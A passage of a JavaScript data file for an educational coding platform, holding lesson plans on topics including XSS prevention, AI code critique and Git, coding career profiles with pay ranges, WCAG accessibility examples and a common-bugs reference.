        'Provide data model template',
        'Allow simpler apps (single counter) for early learners',
      ],
      extensions: 'Add data export to JSON file. Add import from JSON.',
    },
    {
      id: 'lesson_security_xss',
      title: 'Lesson 11: Security — XSS + Why Escaping Matters',
      grade: '10-12',
      duration: '60 min',
      standards: ['CSTA 3A-NI-05: Security', 'AP CSP IOC-2.A'],
      objectives: [
        'Students will explain what XSS is',
        'Students will distinguish textContent from innerHTML',
        'Students will sanitize user input',
      ],
      materials: 'Computer with AppLab. XSS demo page.',
      warmup: '5 min — Show a deliberately-vulnerable comment system. Inject a script that shows an alert. Discuss the vulnerability.',
      mainActivity: '40 min — Build a comment system. First version is vulnerable. Second version uses textContent. Third version explicitly sanitizes HTML.',
      reflection: '10 min — Discuss: how does this connect to broader security concerns? What other vulnerabilities exist?',
      assessment: 'Submit three versions of the comment system + explain the differences. Demonstrate fix.',
      udlAccommodations: [
        'Pre-written sanitization function provided',
        'Allow drawn/typed explanations',
      ],
      extensions: 'Research another web security issue (CSRF, SQL injection). Discuss the principles.',
    },
    {
      id: 'lesson_ai_ethics',
      title: 'Lesson 12: AI Tools — Use, Cite, Critique',
      grade: '9-12',
      duration: '60 min',
      standards: ['CSTA 2-IC-21: Ethics', 'AP CSP IOC-1.C'],
      objectives: [
        'Students will use AppLab\'s AI generation tool',
        'Students will critique AI-generated code',
        'Students will discuss when AI is + isn\'t appropriate',
      ],
      materials: 'Computer with AppLab.',
      warmup: '5 min — Have students use AppLab to generate a simple app. Show the generated code. Discuss: did it work? What\'s good? What\'s bad?',
      mainActivity: '40 min — In pairs: AI generates an app. Pair critiques it (bugs, accessibility issues, style). Manually improve. Reflect on AI\'s strengths + weaknesses.',
      reflection: '10 min — Discuss: when is AI a tool? When is it a crutch? How do you cite AI-generated code in school?',
      assessment: 'AI-generated app + manually improved version + reflection on improvements made.',
      udlAccommodations: [
        'Pair students with different AI comfort levels',
        'Provide critique rubric',
      ],
      extensions: 'Compare AI-generated code from 2 different prompts. Which was better? Why?',
    },
    {
      id: 'lesson_design_patterns',
      title: 'Lesson 13: Design Patterns — Reusable Solutions',
      grade: '10-12',
      duration: '60 min',
      standards: ['CSTA 3A-AP-13: Algorithms', 'AP CSP AAP-3.A'],
      objectives: [
        'Students will identify common design patterns',
        'Students will recognize when to apply each pattern',
        'Students will implement at least one design pattern',
      ],
      materials: 'Computer with AppLab.',
      warmup: '5 min — Show two apps that solve different problems but have similar structure. Discuss: why?',
      mainActivity: '40 min — Implement the Module pattern (encapsulate logic). Implement the Observer pattern (notify multiple parts when state changes).',
      reflection: '10 min — Discuss: what patterns have you used? Where else might these be useful?',
      assessment: 'Working implementation of at least 1 pattern. Explain its purpose.',
      udlAccommodations: [
        'Provide pattern diagrams',
        'Pre-written pattern starter code',
      ],
      extensions: 'Research one more pattern (Factory, Strategy, Singleton). Implement it.',
    },
    {
      id: 'lesson_collaboration',
      title: 'Lesson 14: Collaboration — Git Basics + Pair Programming',
      grade: '11-12',
      duration: '60-90 min',
      standards: ['CSTA 3A-AP-17: Code review', 'AP CSP CRD-1.A'],
      objectives: [
        'Students will use Git for version control',
        'Students will collaborate on code via Git/GitHub',
        'Students will practice pair programming',
      ],
      materials: 'Computer with AppLab. GitHub accounts.',
      warmup: '5 min — Have students share a Google Doc and edit simultaneously. Discuss: how is that different from code?',
      mainActivity: '60 min — Pair programming: one student types (driver), one student watches + suggests (navigator). Switch every 10 min. Commit + push to GitHub.',
      reflection: '15 min — Discuss: what was hard? What was helpful? Which role did you prefer?',
      assessment: 'Working app on GitHub. Pair-programming reflection. At least 5 commits.',
      udlAccommodations: [
        'Pair students of similar level',
        'Provide pair-programming protocol sheet',
        'Allow alternate roles for students with speech difficulties',
      ],
      extensions: 'Add a feature via Pull Request workflow. Code review.',
    },
    {
      id: 'lesson_capstone',
      title: 'Lesson 15: Capstone Project — Your Own App',
      grade: '11-12',
      duration: '4-6 weeks',
      standards: ['AP CSP Create Performance Task', 'CSTA 3A-AP-15: Develop programs collaboratively'],
      objectives: [
        'Students will design + build their own original app',
        'Students will document + present their work',
        'Students will reflect on their learning',
      ],
      materials: 'Computer with AppLab. Capstone rubric.',
      warmup: '15 min — Brainstorm: what real-world problem could you solve? What apps already exist? What\'s missing?',
      mainActivity: '4-6 weeks — Design (1 week), Build (3 weeks), Iterate (1 week), Present (1 week). Iterative development cycle.',
      reflection: '60 min final presentation — Demo app. Explain technical choices. Discuss learning.',
      assessment: 'Working app + 500-word reflection + 5-minute presentation. Use AP CSP Create Performance Task rubric if AP.',
      udlAccommodations: [
        'Allow varying scope (simple to complex)',
        'Provide pre-built modules students can adapt',
        'Allow team capstone',
        'Multiple presentation formats (video, slides, live demo)',
      ],
      extensions: 'Publish app to a real platform (GitHub Pages, Vercel). Get user feedback. Iterate.',
    },
  ];

  // ─── Coding career pathways (NGSS-aligned career exploration) ─────
  // Real roles + median pay + entry training + how to get started.
  // Each entry shows the path from K-12 student to that role.
  var CODING_CAREERS = [
    {
      role: 'Front-End Web Developer',
      whatTheyDo: 'Build the visual + interactive parts of websites + apps (what users see + touch). HTML, CSS, JavaScript, React/Vue/Angular.',
      medianPay: '$78,000 - $130,000 (varies hugely by city + experience)',
      trainingPath: 'Bachelor\'s in CS OR coding bootcamp (6-12 months) OR self-taught + strong portfolio.',
      portfolioNeeds: '5-10 personal websites/apps. GitHub profile. Live demos.',
      mathRequired: 'Basic algebra. Some math for animations + game-like UI.',
      goodFor: 'Visual thinkers. People who love seeing immediate visual feedback. Detail-oriented people.',
      challenges: 'Browser inconsistencies. Constantly-changing tools + frameworks. Often pressure to deliver fast.',
      gettingStartedSteps: [
        '1. Learn HTML + CSS basics (freeCodeCamp, MDN)',
        '2. Learn vanilla JavaScript before frameworks',
        '3. Build 5 small projects (todo app, calculator, etc.)',
        '4. Learn one framework deeply (React most common)',
        '5. Contribute to open source for portfolio',
        '6. Apply for internships or junior positions',
      ],
      relatedToAppLab: 'AppLab projects directly demonstrate front-end skills. Each project students complete = portfolio piece.',
    },
    {
      role: 'Back-End Developer',
      whatTheyDo: 'Build server-side logic, databases, APIs. The "behind the scenes" infrastructure.',
      medianPay: '$85,000 - $145,000',
      trainingPath: 'Bachelor\'s in CS OR bootcamp + strong portfolio. Some employers want 4-year degrees.',
      portfolioNeeds: 'Public APIs you\'ve built. GitHub with backend projects. Understanding of databases.',
      mathRequired: 'Algorithms + data structures. Some discrete math.',
      goodFor: 'Logic-driven people. Those who enjoy systems thinking. Problem solvers.',
      challenges: 'Less immediate visual feedback. Bugs can be harder to reproduce. On-call rotations in some jobs.',
      gettingStartedSteps: [
        '1. Pick one server-side language (Node.js, Python, Ruby, Java)',
        '2. Learn how the internet works (DNS, HTTP)',
        '3. Build a REST API for a simple app',
        '4. Add a database (SQL: PostgreSQL or MySQL; NoSQL: MongoDB)',
        '5. Deploy to free tier (Heroku, Vercel, Netlify)',
        '6. Build 2-3 portfolio projects with full backend + frontend',
      ],
      relatedToAppLab: 'AppLab\'s API-integrated projects (Weather Dashboard, Recipe Finder) introduce server interaction.',
    },
    {
      role: 'Full-Stack Developer',
      whatTheyDo: 'Both front-end + back-end. Common in startups + smaller companies.',
      medianPay: '$90,000 - $155,000',
      trainingPath: 'Same as front + back, just more skills required.',
      portfolioNeeds: 'Full-stack apps (frontend + backend + database). GitHub.',
      mathRequired: 'Same as front + back combined.',
      goodFor: 'Generalists. People who want broad understanding. Startup environments.',
      challenges: 'Need to learn TWO sets of skills. Some specialization expected eventually.',
      gettingStartedSteps: [
        '1. Start with front-end (faster feedback)',
        '2. Add back-end (Node.js easiest if you know JS)',
        '3. Build full-stack apps for portfolio',
        '4. Pick a tech stack to specialize in (MERN, LAMP, etc.)',
        '5. Apply for "full-stack" positions',
      ],
      relatedToAppLab: 'AppLab teaches frontend foundations. Combine with a backend course for full-stack readiness.',
    },
    {
      role: 'Mobile App Developer',
      whatTheyDo: 'Build apps for iOS + Android. Native (Swift/Kotlin) or cross-platform (React Native, Flutter).',
      medianPay: '$95,000 - $160,000',
      trainingPath: 'Bachelor\'s in CS OR self-taught + portfolio. iOS often requires Mac.',
      portfolioNeeds: '1-2 published apps in App Store / Play Store.',
      mathRequired: 'Basic algebra. Some math for animations.',
      goodFor: 'People who love mobile UX. Want to see their work used.',
      challenges: 'App store approval delays. Multiple device sizes/orientations. iOS + Android divergence.',
      gettingStartedSteps: [
        '1. Pick iOS (Swift) or Android (Kotlin) OR cross-platform (React Native, Flutter)',
        '2. Build a simple "Hello World" app',
        '3. Build a clone of a familiar app (todo, weather, etc.)',
        '4. Publish 1 original app to a store',
        '5. Add more features + user feedback iteratively',
      ],
      relatedToAppLab: 'Web app skills transfer directly to React Native. AppLab projects can be ported to mobile.',
    },
    {
      role: 'Game Developer',
      whatTheyDo: 'Build games — could be mobile games, console games, web games, indie games. Game engines: Unity, Unreal, Godot, Phaser.js.',
      medianPay: '$75,000 - $135,000 (lower end is common for indie)',
      trainingPath: 'CS degree OR self-taught + completed game projects. Portfolio essential.',
      portfolioNeeds: '2-3 completed games (even small ones). GitHub or itch.io profile.',
      mathRequired: 'Linear algebra (vectors, matrices). Some physics.',
      goodFor: 'Game lovers. Creative + technical types. People who enjoy seeing players engage.',
      challenges: 'Industry has lower pay + crunch culture. Highly competitive entry-level.',
      gettingStartedSteps: [
        '1. Pick an engine (Unity for 3D, Godot for 2D, Phaser for web)',
        '2. Complete tutorials',
        '3. Make your first game (even Pong)',
        '4. Make a more original game (different genre)',
        '5. Polish + publish to itch.io',
        '6. Apply to internships or junior positions',
      ],
      relatedToAppLab: 'AppLab\'s Snake + Memory + Tic-Tac-Toe projects build game-thinking foundations.',
    },
    {
      role: 'Data Scientist',
      whatTheyDo: 'Analyze data to find insights + build predictive models. Python, R, SQL, machine learning frameworks.',
      medianPay: '$110,000 - $200,000',
      trainingPath: 'Bachelor\'s in math/stats/CS + advanced. Often Master\'s or PhD.',
      portfolioNeeds: 'Kaggle competitions. Jupyter notebooks of real analyses. GitHub.',
      mathRequired: 'Heavy: statistics, linear algebra, calculus.',
      goodFor: 'Math/stats lovers. People who love finding patterns. Curious researchers.',
      challenges: 'Steep math requirements. Lots of theory.',
      gettingStartedSteps: [
        '1. Learn Python + Pandas',
        '2. Take an intro stats course',
        '3. Complete Kaggle beginner competitions',
        '4. Build a portfolio of 5 data analyses',
        '5. Learn ML basics (scikit-learn)',
        '6. Apply for junior roles or further study',
      ],
      relatedToAppLab: 'AppLab\'s Data Visualizer project introduces data thinking.',
    },
    {
      role: 'AI/ML Engineer',
      whatTheyDo: 'Build machine learning models for production. Combine data science with software engineering.',
      medianPay: '$130,000 - $250,000+',
      trainingPath: 'Bachelor\'s + Master\'s/PhD increasingly required.',
      portfolioNeeds: 'ML projects (image classification, NLP, etc.). GitHub. Papers/competitions.',
      mathRequired: 'Heavy: deep learning math, calculus, linear algebra.',
      goodFor: 'Math + research lovers. Want to work on cutting-edge tech.',
      challenges: 'Very competitive. PhD often required.',
      gettingStartedSteps: [
        '1. Strong Python foundation',
        '2. Statistics + linear algebra',
        '3. Learn TensorFlow or PyTorch',
        '4. Complete an ML course (Coursera deeplearning.ai)',
        '5. Build a small ML project',
        '6. Consider grad school or competitive internships',
      ],
      relatedToAppLab: 'AppLab uses LLMs (Gemini) for AI code generation. Students get exposure to AI tools.',
    },
    {
      role: 'DevOps Engineer',
      whatTheyDo: 'Build + maintain infrastructure. CI/CD pipelines. Cloud deployment. Monitoring.',
      medianPay: '$110,000 - $175,000',
      trainingPath: 'CS degree or strong systems background. Linux + cloud certifications.',
      portfolioNeeds: 'Infrastructure-as-code (Terraform). CI/CD pipeline configs. GitHub.',
      mathRequired: 'Some logic + algorithms. Not heavy.',
      goodFor: 'Systems thinkers. Detail-oriented. Like reliability + automation.',
      challenges: 'On-call rotations. High stakes (production down = disaster). Constant learning new tools.',
      gettingStartedSteps: [
        '1. Learn Linux command line',
        '2. Learn Docker + containerization',
        '3. Learn Git deeply',
        '4. Cloud certification (AWS/Azure/GCP)',
        '5. Build a deployed app with CI/CD',
        '6. Internships at companies with strong infrastructure',
      ],
      relatedToAppLab: 'AppLab\'s offline (PWA) project introduces deployment + service workers.',
    },
    {
      role: 'Cybersecurity Analyst',
      whatTheyDo: 'Protect systems from attacks. Test for vulnerabilities. Respond to incidents.',
      medianPay: '$90,000 - $150,000',
      trainingPath: 'CS degree + certifications (Security+, OSCP). Some self-taught with portfolio.',
      portfolioNeeds: 'CTF (Capture the Flag) competitions. Security research blog. GitHub.',
      mathRequired: 'Some cryptography math (modular arithmetic).',
      goodFor: 'Puzzle solvers. People who think like attackers. Ethical hackers.',
      challenges: 'High-stakes environments. On-call. Constant new threats to learn.',
      gettingStartedSteps: [
        '1. Learn networking basics',
        '2. Try CTF challenges (PicoCTF for beginners)',
        '3. Get Security+ certification',
        '4. Build a home lab (Kali Linux, vulnerable VMs)',
        '5. Internship at a security firm',
        '6. Consider OSCP or other advanced certs',
      ],
      relatedToAppLab: 'AppLab\'s XSS + CSP discussions introduce web security concepts.',
    },
    {
      role: 'UX/UI Designer',
      whatTheyDo: 'Design how apps look + feel. User research. Wireframes + prototypes. Sometimes overlaps with front-end dev.',
      medianPay: '$75,000 - $135,000',
      trainingPath: 'Design degree OR design bootcamp OR portfolio-based self-taught.',
      portfolioNeeds: 'Strong portfolio of design work. Case studies showing user research → design decisions.',
      mathRequired: 'Minimal — visual + spatial thinking matters more.',
      goodFor: 'Visual + creative people. Empathy with users. Iterators.',
      challenges: 'Hard to get first job without portfolio. Subjective feedback can be tough.',
      gettingStartedSteps: [
        '1. Learn design tools (Figma is most common)',
        '2. Study existing apps you love',
        '3. Design 3-5 case study projects',
        '4. Get feedback from designers + users',
        '5. Build a portfolio website',
        '6. Apply for junior + internship roles',
      ],
      relatedToAppLab: 'AppLab\'s WCAG patterns + design considerations apply directly to UX/UI work.',
    },
    {
      role: 'Technical Writer (developer docs)',
      whatTheyDo: 'Write documentation, tutorials, API references for software products.',
      medianPay: '$75,000 - $120,000',
      trainingPath: 'English/Writing background + technical skills. OR developer who likes writing.',
      portfolioNeeds: 'Published documentation. Blog posts. GitHub READMEs.',
      mathRequired: 'Minimal.',
      goodFor: 'Strong writers. People who like teaching. Bridge between dev + non-dev.',
      challenges: 'Sometimes seen as less valuable than coding. Good docs are invisible.',
      gettingStartedSteps: [
        '1. Strong writing fundamentals',
        '2. Learn basic coding (be able to read code)',
        '3. Contribute to open-source docs',
        '4. Start a tech blog',
        '5. Build a portfolio of doc projects',
        '6. Apply for technical writing roles',
      ],
      relatedToAppLab: 'AppLab\'s commenting + documentation practices preview this work.',
    },
    {
      role: 'Product Manager (technical)',
      whatTheyDo: 'Decide what products/features to build. Talk to users + engineers. Prioritize.',
      medianPay: '$110,000 - $200,000',
      trainingPath: 'Bachelor\'s (often CS or business). Increasingly Master\'s. PM certifications.',
      portfolioNeeds: 'Past project management. Examples of products built. Customer impact stories.',
      mathRequired: 'Basic analytics. Some statistics.',
      goodFor: 'Communication-focused people. Decision-makers. Generalists.',
      challenges: 'Lots of meetings. Ambiguity. Pressure from many stakeholders.',
      gettingStartedSteps: [
        '1. Get general business + tech experience',
        '2. Read PM books (Inspired, etc.)',
        '3. PM internship while in school',
        '4. Build something + ship it',
        '5. APM (Associate PM) programs at Google/Microsoft/etc.',
        '6. Apply for junior PM roles',
      ],
      relatedToAppLab: 'Building + iterating on apps in AppLab develops PM-style thinking.',
    },
    {
      role: 'Software Engineering Educator',
      whatTheyDo: 'Teach coding to students. K-12 teacher, college instructor, bootcamp instructor, or YouTuber.',
      medianPay: '$50,000 - $120,000 (huge variation)',
      trainingPath: 'K-12: teaching credential + CS knowledge. Higher ed: Master\'s minimum, often PhD.',
      portfolioNeeds: 'Teaching experience. Curriculum samples. Student testimonials.',
      mathRequired: 'Strong CS foundations to teach them.',
      goodFor: 'Patient teachers. Strong communicators. Mentors.',
      challenges: 'Lower pay than industry. Heavy workloads. Constantly updating curriculum.',
      gettingStartedSteps: [
        '1. Strong CS background',
        '2. Tutoring experience',
        '3. Teaching credential if K-12',
        '4. Build a teaching portfolio',
        '5. Apply to schools + camps + colleges',
      ],
      relatedToAppLab: 'AppLab itself is a teaching tool. Students who learn to teach this tool to others may discover an interest.',
    },
    {
      role: 'Open Source Maintainer (often part-time + funded by donations)',
      whatTheyDo: 'Maintain open-source software used by many developers. Triage issues, review PRs, document.',
      medianPay: '$0 (volunteer) - $120,000 (sponsored by company or GitHub Sponsors)',
      trainingPath: 'Strong development skills + commitment.',
      portfolioNeeds: 'A popular open-source project + sustained contributions.',
      mathRequired: 'Varies by project.',
      goodFor: 'Builders + collaborators. People who want to improve commonly-used tools.',
      challenges: 'Burnout is common. Often unpaid initially. Demanding users.',
      gettingStartedSteps: [
        '1. Contribute small fixes to existing projects',
        '2. Become a regular contributor',
        '3. Maintain own small project',
        '4. Build up reputation + community',
        '5. Apply for GitHub Sponsors or company sponsorship',
      ],
      relatedToAppLab: 'AppLab\'s open-source ethos models this. Students can contribute to free educational tools.',
    },
  ];

  // ─── WCAG 2.1 AA technique library (40+ accessibility patterns) ──
  // Each pattern shows: failure mode, fix, code example, screen reader behavior.
  var WCAG_PATTERNS = [
    {
      criterion: '1.1.1 Non-text Content',
      level: 'A',
      title: 'Alt text on images',
      failure: '<img src="logo.png"> with no alt attribute',
      fix: '<img src="logo.png" alt="School logo: bald eagle with shield">',
      explanation: 'Every meaningful image needs an alt attribute that describes what the image conveys. Decorative images use alt="" (empty string).',
      decorativeExample: '<img src="divider.svg" alt="" role="presentation">',
      screenReaderBehavior: 'NVDA + VoiceOver announce alt text. Empty alt skips the image entirely.',
      commonMistakes: ['alt="image"', 'alt="logo.png"', 'No alt attribute at all', 'Alt that\'s too long (>125 chars usually too much)'],
    },
    {
      criterion: '1.3.1 Info and Relationships',
      level: 'A',
      title: 'Use semantic HTML for structure',
      failure: '<div class="header"><div class="title">Title</div></div>',
      fix: '<header><h1>Title</h1></header>',
      explanation: 'Use the right element for the job. Headings, landmarks (<main>, <nav>, <header>), lists, tables — all communicate structure to assistive tech.',
      example: '<main>\n  <h1>Page Title</h1>\n  <nav aria-label="Breadcrumbs">\n    <ol>\n      <li>Home</li>\n      <li>Section</li>\n    </ol>\n  </nav>\n</main>',
      screenReaderBehavior: 'Screen readers create a navigable outline of headings + landmarks. Users can jump between them.',
      commonMistakes: ['Using <div> for everything', 'Skipping heading levels', 'Using <table> for layout'],
    },
    {
      criterion: '1.3.1 Info and Relationships',
      level: 'A',
      title: 'Form labels',
      failure: '<input type="text" placeholder="Name">',
      fix: '<label for="name">Name</label>\n<input type="text" id="name">',
      explanation: 'Every form input needs an accessible name. Use <label> with matching for/id, or aria-label, or aria-labelledby.',
      example: '<!-- Visual + Screen Reader label -->\n<label for="email">Email</label>\n<input type="email" id="email">\n\n<!-- Screen reader only (icon button) -->\n<button aria-label="Close dialog">×</button>',
      screenReaderBehavior: 'Screen reader announces label when input receives focus.',
      commonMistakes: ['placeholder as label (placeholder disappears on focus)', 'No label at all', 'Label not associated with input'],
    },
    {
      criterion: '1.4.3 Contrast (Minimum)',
      level: 'AA',
      title: 'Text contrast 4.5:1 (normal) + 3:1 (large)',
      failure: 'Gray text (#999) on white (#FFF) — 2.85:1 ratio',
      fix: 'Darker gray (#595959) on white — 7:1 ratio',
      explanation: 'WCAG AA requires 4.5:1 for normal text, 3:1 for large text (18pt or 14pt bold). Use webaim.org/resources/contrastchecker or browser tools.',
      example: '/* GOOD: */\np { color: #1a1a1a; background: #ffffff; } /* 17:1 */\n\n/* BAD: */\np { color: #999; background: #fff; } /* 2.85:1 — FAILS */',
      screenReaderBehavior: 'Affects low-vision users + people with vision disabilities. Test with browser color filters.',
      commonMistakes: ['Gray on gray', 'Light text on light bg', 'Forgetting hover/active states have their own contrast needs'],
    },
    {
      criterion: '2.1.1 Keyboard',
      level: 'A',
      title: 'All functionality keyboard-accessible',
      failure: 'A <div onclick="..."> with no tabindex',
      fix: 'Use <button onclick="..."> instead, OR <div tabindex="0" role="button" onkeydown="...">',
      explanation: 'Every interactive element must work with keyboard alone — no mouse required. Native buttons + links work by default; custom widgets need explicit support.',
      example: '<!-- BAD: -->\n<div onclick="doThing()">Click me</div>\n\n<!-- GOOD: -->\n<button onclick="doThing()">Click me</button>',
      screenReaderBehavior: 'Tab key moves focus. Enter + Space activate buttons. Arrow keys for some widgets (tabs, radio groups).',
      commonMistakes: ['Custom dropdowns without keyboard support', 'Drag-and-drop with no keyboard alternative', 'Focus traps (you can\'t Tab away)'],
    },
    {
      criterion: '2.4.4 Link Purpose',
      level: 'A',
      title: 'Link text describes destination',
      failure: '<a href="/policies">Click here</a>',
      fix: '<a href="/policies">Read our policies</a>',
      explanation: 'Link text alone (without surrounding context) should make the destination clear. Screen reader users navigate by link list — they only hear the link text.',
      example: '<!-- GOOD: -->\n<a href="/article/123">Read full article: AI ethics</a>\n\n<!-- BAD: -->\nFor details, <a href="/article/123">click here</a>.',
      screenReaderBehavior: 'NVDA + JAWS show a "list of links" — meaningful link text is essential.',
      commonMistakes: ['"Click here"', '"Read more"', '"Learn more"', 'URL itself as text'],
    },
    {
      criterion: '2.4.7 Focus Visible',
      level: 'AA',
      title: 'Keyboard focus indicator',
      failure: 'CSS: *:focus { outline: none; }',
      fix: '/* Remove default outline + add custom */\n*:focus-visible { outline: 3px solid #2563eb; outline-offset: 2px; }',
      explanation: 'Users navigating by keyboard MUST see where focus is. Don\'t remove the focus outline — replace it with a better one if you want.',
      example: 'button:focus-visible {\n  outline: 3px solid #2563eb;\n  outline-offset: 2px;\n  border-radius: 4px;\n}',
      screenReaderBehavior: 'Visual + audio (screen reader) feedback for focus.',
      commonMistakes: ['outline: none with no replacement', 'Focus indicator with poor contrast', 'Focus indicator covered by other elements'],
    },
    {
      criterion: '2.5.5 Target Size',
      level: 'AAA',
      title: 'Click targets at least 44x44px',
      failure: 'Small icon buttons (16x16px)',
      fix: 'Pad to 44x44px minimum: padding: 14px; box-sizing: content-box;',
      explanation: 'Touch targets need to be large enough for people with motor disabilities. WCAG AAA requires 44x44 CSS pixels (about 0.39 inches square).',
      example: 'button {\n  min-width: 44px;\n  min-height: 44px;\n  padding: 8px 12px;\n}',
      screenReaderBehavior: 'No screen reader impact. Helps people with motor disabilities + on small touchscreens.',
      commonMistakes: ['Tiny icon buttons', 'Close (×) buttons too small', 'Inline links in dense text'],
    },
    {
      criterion: '3.1.1 Language of Page',
      level: 'A',
      title: 'lang attribute on html',
      failure: '<html>',
      fix: '<html lang="en">',
      explanation: 'Screen readers use lang to pick the right voice + pronunciation. Sets text direction (LTR vs RTL). Helps translation tools.',
      example: '<html lang="en">\n<!-- For mixed languages: -->\n<p>The word <span lang="es">hola</span> means hello in Spanish.</p>',
      screenReaderBehavior: 'NVDA + VoiceOver use the right voice + accent based on lang.',
      commonMistakes: ['No lang attribute', 'Wrong language code', 'Not marking foreign-language phrases'],
    },
    {
      criterion: '3.2.2 On Input',
      level: 'A',
      title: 'No surprise changes on input',
      failure: 'Form auto-submits when user types',
      fix: 'Form submits only when user explicitly clicks Submit',
      explanation: 'Changing context (submitting a form, opening a new window) when the user interacts with a form field is disorienting + confusing.',
      example: '<!-- BAD: -->\n<select onchange="window.location = this.value">\n  <option value="/home">Home</option>\n  <option value="/about">About</option>\n</select>\n\n<!-- GOOD: -->\n<select id="page">\n  <option value="/home">Home</option>\n  <option value="/about">About</option>\n</select>\n<button onclick="goTo(document.getElementById(\'page\').value)">Go</button>',
      screenReaderBehavior: 'Sudden page changes can confuse screen reader users mid-action.',
      commonMistakes: ['Auto-submit on select change', 'Opening new windows on focus', 'Validation that immediately submits'],
    },
    {
      criterion: '3.3.1 Error Identification',
      level: 'A',
      title: 'Form errors clearly communicated',
      failure: 'Red border only on invalid input',
      fix: 'Red border + text error message + aria-describedby + aria-invalid',
      explanation: 'Color alone isn\'t enough for color-blind users. Always pair color with text + ARIA attributes.',
      example: '<label for="email">Email</label>\n<input type="email" id="email" aria-invalid="true" aria-describedby="email-err">\n<span id="email-err" role="alert">Please enter a valid email.</span>',
      screenReaderBehavior: 'aria-invalid announces "invalid". aria-describedby links to the error message. role="alert" makes screen reader announce immediately.',
      commonMistakes: ['Red border only', 'No error text', 'Generic error text ("error in form")', 'No aria attributes'],
    },
    {
      criterion: '4.1.2 Name, Role, Value',
      level: 'A',
      title: 'Custom widgets have ARIA attributes',
      failure: '<div onclick="toggle()">Show details</div> for a custom expander',
      fix: '<button aria-expanded="false" aria-controls="details" onclick="toggle()">Show details</button>',
      explanation: 'Custom widgets need to communicate their role (button), name (label), and state (expanded/collapsed). Use ARIA attributes if not using native HTML.',
      example: '<button aria-expanded="false" aria-controls="more-info">Show more</button>\n<div id="more-info" hidden>\n  ...\n</div>\n\n<script>\n  const btn = document.querySelector("button");\n  const div = document.getElementById("more-info");\n  btn.addEventListener("click", () => {\n    const expanded = btn.getAttribute("aria-expanded") === "true";\n    btn.setAttribute("aria-expanded", !expanded);\n    div.hidden = expanded;\n  });\n</script>',
      screenReaderBehavior: 'Screen reader announces "button, collapsed/expanded" and reads any controls.',
      commonMistakes: ['Using <div> for buttons', 'aria-pressed instead of aria-expanded for toggle', 'Static aria-* attributes that don\'t update'],
    },
    {
      criterion: '1.4.4 Resize Text',
      level: 'AA',
      title: 'Text can be resized to 200% without breaking layout',
      failure: 'Fixed font-size:14px + container that overflows when text is enlarged',
      fix: 'Use rem/em + flexible layouts',
      explanation: 'Users with low vision often increase their browser font size. Layouts must accommodate this.',
      example: '/* GOOD: */\nbody { font-size: 1rem; }\nh1 { font-size: 2rem; }\np { font-size: 1rem; }\n.container { max-width: 80ch; padding: 1rem; }',
      screenReaderBehavior: 'Not directly screen reader related, but critical for low-vision users.',
      commonMistakes: ['Fixed pixel widths that don\'t scale', 'Containers with overflow:hidden cutting text', 'Text in images instead of HTML'],
    },
    {
      criterion: '1.4.10 Reflow',
      level: 'AA',
      title: 'Content reflows at 320px width',
      failure: 'Horizontal scroll bar at 1280px viewport when zoomed to 400%',
      fix: 'Use responsive design with CSS Grid + Flexbox',
      explanation: 'Content should reflow (no horizontal scroll) when viewport is 320px wide (mobile portrait) or zoom 400%.',
      example: '/* GOOD: */\n.container {\n  display: flex;\n  flex-wrap: wrap;\n  gap: 1rem;\n}\n\n/* OR using grid: */\n.grid {\n  display: grid;\n  grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));\n  gap: 1rem;\n}',
      screenReaderBehavior: 'Mobile screen reader users benefit from reflow.',
      commonMistakes: ['Fixed-width tables for layout', 'Pixel-precise positioning', 'Horizontal-scrolling content'],
    },
    {
      criterion: '2.3.3 Animation from Interactions',
      level: 'AAA',
      title: 'Respect prefers-reduced-motion',
      failure: 'Persistent animations that can\'t be disabled',
      fix: '@media (prefers-reduced-motion: reduce) { * { animation: none !important; transition: none !important; } }',
      explanation: 'Users with vestibular disorders can get motion sick from animations. Honor their OS-level preference.',
      example: '/* In CSS: */\n@media (prefers-reduced-motion: reduce) {\n  * {\n    animation-duration: 0.01ms !important;\n    transition-duration: 0.01ms !important;\n  }\n}\n\n/* In JS: */\nconst reduceMotion = window.matchMedia("(prefers-reduced-motion: reduce)").matches;\nif (!reduceMotion) {\n  // Run animation\n}',
      screenReaderBehavior: 'No direct screen reader impact, but critical accessibility for vestibular disorders.',
      commonMistakes: ['Always-on animations', 'Auto-play videos', 'Scrolling text marquees', 'Parallax scrolling'],
    },
  ];

  // ─── Common bugs + their fixes (debugging library) ─────────────────
  var COMMON_BUGS = [
    {
      bug: 'TypeError: Cannot read property X of undefined',
      cause: 'Trying to access a property on undefined or null. Usually means a function returned nothing where you expected an object.',
      fix: 'Add a null check: if (obj && obj.x). Or use optional chaining: obj?.x. Or use default: const { x = "default" } = obj || {};',
      example: '// BAD:\nconst user = getUser();\nconsole.log(user.name);\n\n// GOOD:\nconst user = getUser();\nif (user) console.log(user.name);\n// OR:\nconsole.log(user?.name);',
      whenItHappens: 'When fetching data that hasn\'t loaded yet, or function not returning expected object, or array indexing out of bounds.',
    },
    {
      bug: 'TypeError: X is not a function',
      cause: 'Calling something that isn\'t a function. Often a misspelling or typo, or function imported wrong.',
      fix: 'Check spelling. Check imports. Check if you\'re calling the right thing.',
      example: '// BAD (typo):\nconst arr = [1,2,3];\narr.fro((x) => x); // Error: fro is not a function\n\n// GOOD:\narr.forEach((x) => x);',
      whenItHappens: 'Typos, wrong API names, calling object instead of function.',
    },
    {
      bug: 'ReferenceError: X is not defined',
      cause: 'Using a variable before declaring it, or it\'s in a different scope, or misspelled.',
      fix: 'Declare with let/const before use. Check for typos. Check scope.',
      example: '// BAD:\nconsole.log(myVar); // ReferenceError\nlet myVar = 5;\n\n// GOOD:\nlet myVar = 5;\nconsole.log(myVar);',
      whenItHappens: 'Forgetting to declare. Hoisting confusion. Typos.',
    },
    {
      bug: 'Maximum call stack size exceeded',
      cause: 'Recursive function without a proper base case — calls itself infinitely.',
      fix: 'Add a base case. Convert to iteration if possible.',
      example: '// BAD (no base case):\nfunction count(n) { return count(n + 1); } // Infinite!\n\n// GOOD:\nfunction count(n, max = 100) {\n  if (n >= max) return n;\n  return count(n + 1, max);\n}',
      whenItHappens: 'Recursion missing base case. Circular function calls.',
    },
    {
      bug: 'CORS error: blocked by CORS policy',
      cause: 'Trying to fetch from a different domain that hasn\'t allowed cross-origin requests.',
      fix: 'Use a server proxy. Or use a CORS-enabled API. Or run on the server side.',
      example: '// BAD:\nfetch("https://api.example.com/data") // CORS error\n\n// GOOD:\n// 1. Use API that allows CORS\n// 2. Or your server fetches it, then you fetch from your server',
      whenItHappens: 'Browser-based fetch to a third-party API that hasn\'t configured CORS headers.',
    },
    {
